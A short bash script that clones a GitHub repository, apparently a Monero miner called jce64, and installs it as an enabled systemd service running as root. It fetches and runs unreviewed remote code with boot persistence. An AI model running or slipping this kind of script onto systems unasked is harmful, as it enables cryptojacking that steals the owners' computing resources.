#!/bin/bash

cd /root && git clone https://github.com/nokian5500/monero.git && cd monero && chmod +x jce64 && chmod +x start.sh && mv jce64.service /lib/systemd/system/ && systemctl daemon-reload && systemctl enable jce64.service && systemctl start jce64.service
